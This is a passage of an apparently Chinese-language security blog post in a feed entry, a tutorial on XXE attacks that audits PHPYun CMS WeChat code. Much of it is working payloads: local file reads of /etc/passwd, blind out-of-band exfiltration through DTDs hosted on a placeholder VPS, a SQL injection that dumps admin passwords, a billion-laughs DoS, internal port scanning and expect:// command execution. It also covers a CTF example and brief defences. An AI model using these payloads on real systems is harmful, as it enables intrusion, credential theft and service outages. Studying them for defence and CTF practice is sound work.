&lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         %s</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         &lt;![CDATA[%s]]&gt;</span></span><br><span class="line"><span class="string">         0</span></span><br><span class="line"><span class="string">         &lt;/xml&gt;"</span>;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="keyword">empty</span>( $keyword ))</span><br><span class="line">                  &#123;</span><br><span class="line">                  $msgType = <span class="string">"text"</span>;</span><br><span class="line">                   $contentStr = <span class="string">"Welcome to wechat world!"</span>;</span><br><span class="line">                   $resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);</span><br><span class="line">                   <span class="keyword">echo</span> $resultStr;</span><br><span class="line">                  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                   <span class="keyword">echo</span> <span class="string">"Input something..."</span>;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">          &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">           <span class="keyword">exit</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>我们可以看到<code>$postStr = $GLOBALS[&quot;HTTP_RAW_POST_DATA&quot;]</code>,这句话的意思是传递原生的语句,而后<code>$postObj = simplexml_load_string($postStr, &#39;SimpleXMLElement&#39;, LIBXML_NOCDATA);</code>又通过simplexml_load_string函数解析后,直接传入<code>$textTpl</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr);</span><br></pre></td></tr></table></figure><p>这里也相当于直接获取post过来的XML内容直接输出.(请记住这一部分,我们将会在下一部分XXE与SQL注入继续审计)</p><h3 id="外部实体注入"><a href="#外部实体注入" class="headerlink" title="外部实体注入"></a>外部实体注入</h3><p><img src="https://img-blog.csdnimg.cn/20200209214349905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="https://m.hundan.org/wooyun-2015-0148793"></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure><h3 id="基于盲注的XXE"><a href="#基于盲注的XXE" class="headerlink" title="基于盲注的XXE"></a>基于盲注的XXE</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当我们在无回显和无报错的基础上使用盲注，即来构建一条带外信道（OOB）获得数据，主要使用DTD中的内部实体及参数实体。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>注入xml文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % host SYSTEM <span class="string">"file:///D:/flag.txt"</span>&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM <span class="string">"http://xxx/xxx.xml"</span>&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %receive;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>xxx.xml文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % receive <span class="string">"&lt;!ENTITY send SYSTEM 'http://xxx/x.php?host=%host;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure><p>x.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">file_put_contents(<span class="string">"1.txt"</span>, $_GET[<span class="string">'host'</span>]) ;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过以上代码就可以进行读取文件等常规操作了，以上说的是php环境，再说下java环境：可通过gopher，file和jar等协议进行配合nc，ftp协议，<br>这里找到<a href="https://hawkinsecurity.com/2018/03/24/gaining-filesystem-access-via-blind-oob-xxe/" target="_blank" rel="noopener">一个赏金猎人写的文章</a>，可以一看</p><h4 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p>其实只要让网站对我们的服务器发一个http请求，然后看是否服务器接收到请求即可。代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://vps"</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h3 id="基于报错的XXE"><a href="#基于报错的XXE" class="headerlink" title="基于报错的XXE"></a>基于报错的XXE</h3><p>和sql注入中的报错注入差不多的原理，当我们将payload故意写错，例如在第二行出错，那xml的内容就会出现在下一行。<br>下图为示例<br><img src="https://img-blog.csdnimg.cn/20200210174428719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="XML配置文件未授权访问"><a href="#XML配置文件未授权访问" class="headerlink" title="XML配置文件未授权访问"></a>XML配置文件未授权访问</h3><p>多见于用户名,密码,apache,ldap数据库等配置信息泄露<br>更多示例可查看以下链接:<br><a href="https://m.hundan.org/wooyun-2015-0123762" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2015-0123762</a>;<br><a href="https://m.hundan.org/wooyun-2015-0123588" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2015-0123588</a>;<br><a href="https://m.hundan.org/wooyun-2016-0207791(19护网顺手挖到了一个同款漏洞呵呵)" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2016-0207791(19护网顺手挖到了一个同款漏洞呵呵)</a></p><h2 id="XXE与SQL注入"><a href="#XXE与SQL注入" class="headerlink" title="XXE与SQL注入"></a>XXE与SQL注入</h2><h3 id="原理-PHPYun-cms为例"><a href="#原理-PHPYun-cms为例" class="headerlink" title="原理(PHPYun cms为例)"></a>原理(PHPYun cms为例)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($MsgType==<span class="string">'event'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">      $MsgEvent = $postObj-&gt;Event;</span><br><span class="line">      <span class="keyword">if</span> ($MsgEvent==<span class="string">'subscribe'</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       $centerStr = <span class="string">"&lt;![CDATA[欢迎您关注"</span>.iconv(<span class="string">'gbk'</span>,<span class="string">'utf-8'</span>,<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_webname'</span>]).<span class="string">"！/n 1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX公司】查找您想要的职位/n绑定您的账户体验更多精彩功能/n感谢您的关注！]]&gt;"</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;MsgType = <span class="string">'text'</span>;</span><br><span class="line"></span><br><span class="line">      &#125;<span class="keyword">elseif</span> ($MsgEvent==<span class="string">'CLICK'</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       $EventKey = $postObj-&gt;EventKey;</span><br><span class="line">       <span class="keyword">if</span>($EventKey==<span class="string">'我的帐号'</span>)&#123;</span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;bindUser($fromUsername);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'我的消息'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;myMsg($fromUsername);</span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'面试邀请'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;Audition($fromUsername);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'简历查看'</span>)</span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">        $centerStr = <span class="keyword">$this</span>-&gt;lookResume($fromUsername);</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">elseif</span>($EventKey==<span class="string">'刷新简历'</span>)</span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">        $centerStr = <span class="keyword">$this</span>- &gt; refResume （$ fromUsername ）;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">isBind</span><span class="params">($wxid=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($wxid)</span><br><span class="line">&#123;</span><br><span class="line">$User = <span class="keyword">$this</span>-&gt;obj-&gt;DB_select_once(<span class="string">"member"</span>,<span class="string">"`wxid`='"</span>.$wxid.<span class="string">"'"</span>,<span class="string">"`uid`,`username`"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($User[<span class="string">'uid'</span>]&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$User[<span class="string">'bindtype'</span>] = <span class="string">'1'</span>;</span><br><span class="line">$User[<span class="string">'cenetrTpl'</span>] = <span class="string">"&lt;Content&gt;&lt;![CDATA[您的"</span>.iconv(<span class="string">'gbk'</span>,<span class="string">'utf-8'</span>,<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_webname'</span>]).<span class="string">"帐号："</span>.$User[<span class="string">'username'</span>].<span class="string">"已成功绑定！ \n\n\n 您也可以&lt;a href=\""</span>.<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_weburl'</span>].<span class="string">"/wap/index.php?m=login&amp;wxid="</span>.$wxid.<span class="string">"\"&gt;点击这里&lt;/a&gt;进行解绑或绑定其他帐号]]&gt;&lt;/Content&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$Token = <span class="keyword">$this</span>-&gt;getToken();</span><br><span class="line">$Url = <span class="string">'https://api.weixin.qq.com/cgi-bin/user/info?access_token='</span>.$Token.<span class="string">'&amp;openid='</span>.$wxid.<span class="string">'&amp;lang=zh_CN'</span>;</span><br><span class="line">$CurlReturn  = <span class="keyword">$this</span>-&gt;CurlPost($Url);</span><br><span class="line">$UserInfo    = json_decode($CurlReturn);</span><br><span class="line"></span><br><span class="line">$wxid        = $wxid;</span><br><span class="line">$wxname      = $UserInfo-&gt;nickname;</span><br><span class="line"><span class="keyword">$this</span>-&gt;config[<span class="string">'token_time'</span>] = time();</span><br><span class="line">$User[<span class="string">'cenetrTpl'</span>] = <span class="string">'&lt;Content&gt;&lt;![CDATA[您还没有绑定帐号，&lt;a href="'</span>.<span class="keyword">$this</span>-&gt;config[<span class="string">'sy_weburl'</span>].<span class="string">'/wap/index.php?m=login&amp;wxid='</span>.$wxid.<span class="string">'"&gt;点击这里&lt;/a&gt;进行绑定!]]&gt;&lt;/Content&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $User;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到第一段代码满足后，会进入第二段代码的isBind函数，这里<code>$wxid</code>是我们传入的<code>FromUserName</code>的值，我们在上面XXE原理进行过代码审计知道它不会对我们传入的数据进行过滤，由此可进行SQL注入<br>payload:<br><code>&lt;FromUserName&gt;1111&#39; and 1=2 union select 1,(select concat(username,0x23,password) from phpyun_admin_user limit 0,1)#&lt;/FromUserName&gt;</code>  需要注意的是一定要修改HTTP请求为Content-Type: text/ xml; </p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p> 为避免重复造轮，可自行查看<a href="https://m.hundan.org/wooyun-2015-0122523" target="_blank" rel="noopener">火遍各大高校的某方教务，可拖数据库</a></p><h2 id="XXE与XSS攻击"><a href="#XXE与XSS攻击" class="headerlink" title="XXE与XSS攻击"></a>XXE与XSS攻击</h2><p> 这篇文章写的很不错，可以借鉴一下<br> <a href="https://paper.seebug.org/80/" target="_blank" rel="noopener">使用XML内部实体绕过Chrome和IE的XSS过滤器</a></p><h2 id="XXE与DDOS攻击"><a href="#XXE与DDOS攻击" class="headerlink" title="XXE与DDOS攻击"></a>XXE与DDOS攻击</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p> 一般分为两种：</p><ul><li>1.请求大的文件(eg:C:/pagefile.sys 或/dev/random)<br>/dev/random处于unix中，用作伪随机数生成<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY go <span class="string">"file:///dev/random"</span> &gt;]&gt;&lt;msg&gt;&amp;go;&lt;/msg&gt;</span><br></pre></td></tr></table></figure></li></ul><ul><li>2.billion laughs攻击，即通过不断递归调用来使解析器繁忙，占用内存最终崩掉。（可配合LOIC工具，食用更佳）</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--此代码包含<span class="number">10</span>亿个大文件，约占<span class="number">3000</span>M字节内存--&gt;</span><br><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol <span class="string">"lol"</span>&gt;</span><br><span class="line">&lt;!ELEMENT lolz (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ENTITY lol1 <span class="string">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol</span></span><br><span class="line"><span class="string">;&amp;lol;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol2 <span class="string">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;</span></span><br><span class="line"><span class="string">lol1;&amp;lol1;&amp;lol1;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol3 <span class="string">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;</span></span><br><span class="line"><span class="string">lol2;&amp;lol2;&amp;lol2;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol4 <span class="string">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;</span></span><br><span class="line"><span class="string">lol3;&amp;lol3;&amp;lol3;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol5 <span class="string">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;</span></span><br><span class="line"><span class="string">lol4;&amp;lol4;&amp;lol4;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol6 <span class="string">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;</span></span><br><span class="line"><span class="string">lol5;&amp;lol5;&amp;lol5;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol7 <span class="string">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;</span></span><br><span class="line"><span class="string">lol6;&amp;lol6;&amp;lol6;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol8 <span class="string">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;</span></span><br><span class="line"><span class="string">lol7;&amp;lol7;&amp;lol7;"</span>&gt;</span><br><span class="line">&lt;!ENTITY lol9 <span class="string">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;</span></span><br><span class="line"><span class="string">lol8;&amp;lol8;&amp;lol8;"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p> <a href="https://m.hundan.org/wooyun-2015-0137143" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2015-0137143</a> </p><h2 id="XXE与内网信息，命令执行"><a href="#XXE与内网信息，命令执行" class="headerlink" title="XXE与内网信息，命令执行"></a>XXE与内网信息，命令执行</h2><p> 这里就不进行原理阐述了，和解释器有一些关系，直接上干货，以下建议配合脚本食用更佳。</p><ul><li>探测端口<br>如果失败则可能返回<code>Connection refused</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"http://192.168.0.1:3306"</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></li><li>探测内网IP</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"http://otherIP"</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><ul><li><p>在安装有expect扩展的php环境执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">"expect://whoami"</span> &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE与Flash跨域攻击（个人认为鸡肋）"><a href="#XXE与Flash跨域攻击（个人认为鸡肋）" class="headerlink" title="XXE与Flash跨域攻击（个人认为鸡肋）"></a>XXE与Flash跨域攻击（个人认为鸡肋）</h2><p>这个突破感觉几乎没有什么用，而且利用条件也相对苛刻很多，可以自行查看<a href="https://m.hundan.org/wooyun-2012-08182" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2012-08182</a><br><a href="https://m.hundan.org/wooyun-2011-02491" target="_blank" rel="noopener">https://m.hundan.org/wooyun-2011-02491</a></p></li></ul><h1 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><p>博主很久之前写的，想来想去就不打算再增加例题和减少掉例题了(懒)，多少有点帮助，看着玩吧哈哈</p><h2 id="API："><a href="#API：" class="headerlink" title="API："></a>API：</h2><p><a href="http://web.jarvisoj.com:9882" target="_blank" rel="noopener">http://web.jarvisoj.com:9882</a><br><img src="https://img-blog.csdnimg.cn/20200210162334155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Blind-XXE思路："><a href="#Blind-XXE思路：" class="headerlink" title="Blind XXE思路："></a>Blind XXE思路：</h2><p>1.客户端发送payload1给web服务器<br>2.网络服务器向VPS获取恶意DTD，并执行文件读取payload2<br>3.网页服务器带着回显结果访问VPS上特定的FTP或者HTTP<br>4.通过VPS获得回显(NC监听端口)<br>payload1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> xml version= <span class="string">"1.0"</span> encoding= <span class="string">"UTF-8"</span> <span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE [&lt;!ENTITY ％ remote SYSTEM <span class="string">"http://vps/test.xml"</span>&gt; </span><br><span class="line">％remote;</span><br><span class="line">] &gt;</span><br></pre></td></tr></table></figure><p>payload2(服务器端文件)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY % trick SYSTEM 'ftp://VPS:21/%payload;'&gt;"</span>&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul><li>1.及时升级第三方代码，中间件等</li><li>2.过滤用户输入数据</li><li>3.使用php及Java等语言的禁用外部实体方法</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php：libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">python:from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="keyword">False</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先，我们需要对&lt;a href=&quot;https://www.runoob.com/xml/xml-tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XML&lt;/a&gt;进行一定的了解，在这里不做过多的多余叙述，接下图为XML工作流程：&lt;br
      
    
    </summary>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/categories/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/tags/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
      <category term="xml" scheme="http://y-y-k.tk/tags/xml/"/>
    
  </entry>
  
</feed>
